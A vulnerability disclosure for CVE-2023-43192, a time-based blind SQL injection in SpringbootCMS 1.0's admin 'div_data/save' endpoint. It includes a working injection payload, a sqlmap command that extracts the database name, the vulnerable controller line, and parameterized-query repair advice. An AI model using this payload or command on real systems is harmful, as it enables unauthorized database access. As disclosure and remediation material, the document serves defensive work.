# The name of an affected Product.
SpringbootCMS
# The affected or fixed version(s).
SpringbootCMS 1.0
# The CVE ID for the entry
CVE-2023-43192
# A prose description
SQL injection can exist ina newly created part of the SpringbootCMS background, and the parameters submitted by users are not filtered. As a result, special characters in parameters destroy the original logic of SQL statements. Attackers can use this vulnerability to execute any SQL statement.
# Other supplement
Hole address: http://ip:8888/admin/div_data/save
The code download address: [https://gitee.com/heyewei/SpringBootCMS.git](https://gitee.com/heyewei/SpringBootCMS.git)
Vulnerability location: After logging in to the system, the custom data of the expanded content, the location of the customer name at the time of creation has sql time blind annotation.
# exploit
Vulnerability point
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694506585875-37cef292-a8c7-43f5-b254-1c72c67d0202.png#averageHue=%2368a489&clientId=u7c2a7c15-669d-4&from=paste&height=849&id=u6efc4d54&originHeight=973&originWidth=1913&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=80981&status=done&style=none&taskId=udc6c8f14-6e01-4e87-a7d3-b110595cc16&title=&width=1669.527214829628)
 input 1212' AND (if(left(database(),13)='springbootcms',sleep(5),1)) AND 'OHiO'='OHiO
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694506611629-a8c1613e-cba5-43c4-802a-2a5c512d993c.png#averageHue=%23263237&clientId=u7c2a7c15-669d-4&from=paste&height=847&id=u071e8ce6&originHeight=971&originWidth=1906&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=66535&status=done&style=none&taskId=udccb77f4-7f51-49a6-be8f-fb3161d8078&title=&width=1663.4181241323947)
Discovery delay 5 seconds
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694507708485-3d288f79-52b7-4044-9716-cd4c69d12286.png#averageHue=%23fbfbfb&clientId=u4204e0bc-9665-4&from=paste&height=715&id=u51b5cb09&originHeight=819&originWidth=1897&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=118649&status=done&style=none&taskId=ub877d790-7c51-4737-bbce-1addbc7fe5f&title=&width=1655.5635789502376)
use sqlmap
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694506759108-873b7b9b-a332-46d6-9d71-3a8da0de34c2.png#averageHue=%23100e0d&clientId=u7c2a7c15-669d-4&from=paste&height=696&id=u2d56c9fc&originHeight=798&originWidth=1789&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=120106&status=done&style=none&taskId=uda4c6798-30d3-4ff6-932a-b97eaa9bf3c&title=&width=1561.3090367643517)
python sqlmap.py -r 127_0_0_1_8888_20230912161737.req --tamper=space2comment --batch --current-db
sql is injected out of the database name.
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694507159752-18ebf8bb-589f-4622-8c93-e7e2976b6243.png#averageHue=%230e0d0d&clientId=u4204e0bc-9665-4&from=paste&height=765&id=u1c287bf8&originHeight=877&originWidth=1855&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=155778&status=done&style=none&taskId=u17a93641-0116-471f-a688-0d80e1a0552&title=&width=1618.9090347668375)
# Repair suggestion
(1) Using precompiled statements, using PDO requires care not to concatenate variables directly into PDO statements. All query statements use the parameterized query interface provided by the database, and parameterized statements use parameters instead of embedding user input variables into the SQL statement. At present, almost all database systems provide parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.
(2) Special characters entering the database (' "<>&*; Etc.) for escape processing, or encoding conversion.
# Website source code
The code is located on line 67 of  src/main/java/com/cms/controller/admin/DivDataController.java
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694508026138-9d9a2125-d121-4689-bccf-1bab727f9a12.png#averageHue=%232d2c2b&clientId=u79fd5107-38a1-4&from=paste&height=557&id=uc08618a0&originHeight=638&originWidth=1444&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=115198&status=done&style=none&taskId=u0115bce8-5e44-4230-9a36-b91115905f5&title=&width=1260.2181381149937)
Break point on line 70
It can be seen that 74 lines receive input content and execute insert statements using related methods without filtering or other related operations.
![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694508334670-ab210cdc-74fe-47c9-babe-e13dd54c33e5.png#averageHue=%23372b2a&clientId=ua60f461a-ae5b-4&from=paste&height=389&id=u5dee2983&originHeight=446&originWidth=1461&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=144816&status=done&style=none&taskId=u9c256ebd-1264-4293-ba0e-23430fee644&title=&width=1275.0545012368461)

